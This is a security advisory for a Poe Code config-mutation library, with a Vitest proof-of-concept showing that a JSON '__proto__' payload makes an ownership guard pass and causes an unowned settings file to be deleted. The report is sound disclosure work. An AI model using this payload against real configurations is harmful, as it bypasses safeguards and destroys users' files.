# Config mutations prune onlyIf trusts inherited proto values to authorize deletion

## Summary

`@poe-code/config-mutations` exposes `configMutation.prune({ onlyIf })` so manifests can conditionally remove configuration only when parsed file content proves ownership or eligibility. For JSON input containing `__proto__`, parsing supplies inherited attacker-controlled values to that guard. A file with no own `owner` field can satisfy `onlyIf: (doc) => doc.owner === "me"` and be deleted by a guarded prune.

## Reproduction

Run a transient Vitest probe from the repository root:

```sh
cat > packages/config-mutations/src/__probe__.test.ts <<'PROBE'
import { describe, expect, it } from "vitest";
import { runMutations, configMutation } from "./index.js";

function memoryFs(initial: Record<string, string>) {
  const files = new Map(Object.entries(initial));
  return {
    files,
    readFile: async (path: string) => {
      const content = files.get(path);
      if (content === undefined) throw Object.assign(new Error("missing"), { code: "ENOENT" });
      return content;
    },
    writeFile: async (path: string, content: string) => { files.set(path, content); },
    mkdir: async () => {}, unlink: async (path: string) => { files.delete(path); },
    stat: async () => ({ isFile: () => true, isDirectory: () => false }), readdir: async () => []
  };
}

describe("config prune onlyIf prototype values", () => {
  it("allows inherited JSON data to authorize a guarded deletion", async () => {
    const fs = memoryFs({ "/home/test/settings.json": '{"__proto__":{"owner":"me"},"remove":"secret"}\n' });
    const outcome = await runMutations(
      [configMutation.prune({ target: "~/settings.json", shape: { remove: {} }, onlyIf: (doc) => doc.owner === "me" })],
      { fs: fs as never, homeDir: "/home/test" }
    );
    console.log(JSON.stringify({ outcome, stillExists: fs.files.has("/home/test/settings.json") }));
    expect(outcome.changed).toBe(true);
    expect(outcome.effects).toEqual([{ changed: true, effect: "delete", detail: "delete" }]);
    expect(fs.files.has("/home/test/settings.json")).toBe(false);
  });
});
PROBE
npm exec -- vitest run packages/config-mutations/src/__probe__.test.ts --reporter verbose
rm packages/config-mutations/src/__probe__.test.ts
```

Output:

```text
{"outcome":{"changed":true,"effects":[{"changed":true,"effect":"delete","detail":"delete"}]},"stillExists":false}
✓ packages/config-mutations/src/__probe__.test.ts > config prune onlyIf prototype values > allows inherited JSON data to authorize a guarded deletion
```

## Observed Behavior

`jsonFormat.parse()` returns parsed JSON objects directly at `packages/config-mutations/src/formats/json.ts:16` through `packages/config-mutations/src/formats/json.ts:35`; a parsed own `__proto__` mapping therefore affects later property reads through the object prototype. `applyConfigPrune()` invokes a caller-supplied `onlyIf(current, options)` predicate on that parsed object before pruning at `packages/config-mutations/src/execution/apply-mutation.ts:484` through `packages/config-mutations/src/execution/apply-mutation.ts:504`. When the inherited guard value permits deletion, the resulting empty object causes the executor to unlink the file at `packages/config-mutations/src/execution/apply-mutation.ts:513` through `packages/config-mutations/src/execution/apply-mutation.ts:521`.

## Expected Behavior

Mutation guards should evaluate only actual persisted configuration values, not inherited fields injected through prototype-sensitive parsing or object handling. A file lacking an own `owner` property must not pass an ownership guard and must not be deleted based on a `__proto__` payload.

## Impact

Provider cleanup and unconfiguration manifests that guard destructive removal by checking parsed ownership markers can be bypassed by crafted local configuration. An unrelated or user-maintained file can present an inherited authorization marker and be deleted as though it were safely owned by Poe Code.
